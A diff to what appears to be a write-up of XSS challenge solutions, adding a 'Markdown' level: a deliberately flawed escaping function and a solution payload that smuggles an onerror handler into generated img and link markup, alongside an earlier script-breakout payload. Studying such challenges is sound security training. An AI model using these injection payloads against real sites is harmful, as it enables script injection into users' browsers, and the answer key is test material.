@@ -110,3 +110,24 @@ function escape(s) {
 ```js
 </script><script>alert(1)//
 ```
+
+### Markdown
+
+- Task
+
+```js
+function escape(s) {
+  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
+  return text;
+}
+```
+
+- Solution
+
+```js
+[[x|http://onerror=javascript:alert(1)//]]
+```
